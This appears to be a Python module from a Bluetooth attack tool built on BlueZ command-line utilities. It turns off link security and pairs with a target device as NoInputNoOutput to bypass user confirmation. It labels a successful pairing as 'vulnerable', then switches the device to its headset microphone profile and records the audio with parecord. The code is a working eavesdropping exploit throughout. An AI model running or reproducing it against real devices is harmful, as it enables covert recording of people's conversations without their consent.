from enum import Enum
import re
import shlex
from system import run_and_check, CommandValidationException

class BluezAddressType(Enum):
    BR_EDR = 0
    LE_PUBLIC = 1
    LE_RANDOM = 2

    def __str__(self):
        return self.name

class Address:
    regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")

    def __init__(self, value: str):
        if self.regexp.match(value) is None:
            raise ValueError(f"{value} is not a valid bluetooth address")
        self._address = value.lower()

    def __str__(self):
        return self._address

    def __eq__(self, other):
        return self._address == str(other).lower()

class BluezTarget:
    regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")

    def __init__(self, address: str, type: int | BluezAddressType = BluezAddressType.BR_EDR):
        self.address = Address(address)
        if isinstance(type, int):
            type = BluezAddressType(type)
        elif isinstance(type, str):
            type = BluezAddressType(int(type))
        self.type = type

class BluezIoCaps(Enum):
    DisplayOnly = 0
    DisplayYesNo = 1
    KeyboardOnly = 2
    NoInputNoOutput = 3
    KeyboardDisplay = 4

# ------------------------ Pairing / Connecting ------------------------
def pair_device(target: BluezTarget, verbose: bool = False) -> bool:
    from time import sleep
    # Configure bondable / pairable
    run_and_check(shlex.split("sudo btmgmt bondable true"), verbose=verbose)
    run_and_check(shlex.split("sudo btmgmt pairable true"), verbose=verbose)
    run_and_check(shlex.split("sudo btmgmt linksec false"), verbose=verbose)

    try:
        run_and_check(
            shlex.split(
                f"sudo btmgmt pair -c {BluezIoCaps.NoInputNoOutput.value} -t {target.type.value} {target.address}"
            ),
            is_valid=lambda out: not ("failed" in out and not "Already Paired" in out),
            verbose=verbose,
        )
        sleep(1)
        return True
    except CommandValidationException as e:
        if "status 0x05 (Authentication Failed)" in e.output:
            return False
        raise e

def connect_device(target: BluezTarget, timeout: int = 2, verbose: bool = False) -> bool:
    try:
        run_and_check(
            shlex.split(f"bluetoothctl --timeout {timeout} scan on"), verbose=verbose
        )
        run_and_check(
            shlex.split(f"bluetoothctl connect {target.address}"),
            is_valid=lambda out: not "Failed to connect" in out,
            verbose=verbose,
        )
        return True
    except CommandValidationException:
        return False

# ------------------------ Vulnerability ------------------------
def is_vulnerable(target: BluezTarget, verbose: bool = False) -> bool:
    """
    Check if the device is vulnerable by attempting pairing with NoInputNoOutput
    Returns True if pairing succeeds (vulnerable), False otherwise
    """
    try:
        return pair_device(target, verbose=verbose)
    except Exception:
        return False

# ------------------------ Recording / Playback ------------------------
def normalize_address(target: BluezTarget) -> str:
    return str(target.address).upper().replace(":", "_")

def to_card_name(target: BluezTarget) -> str:
    return "bluez_card." + normalize_address(target=target)

def to_source_name(target: BluezTarget) -> str:
    return "bluez_input." + normalize_address(target) + ".0"

def record(target: BluezTarget, outfile: str, verbose: bool = True):
    import subprocess
    source_name = to_source_name(target)
    card_name = to_card_name(target)
    run_and_check(
        shlex.split(f"pactl set-card-profile {card_name} headset-head-unit-msbc"),
        verbose=verbose,
    )
    try:
        run_and_check(["parecord", "-d", source_name, outfile], verbose=verbose)
    except KeyboardInterrupt:
        pass
    except:
        raise

def playback(sink: str, file: str, verbose: bool = True):
    run_and_check(["paplay", "-d", sink, file], verbose=verbose)
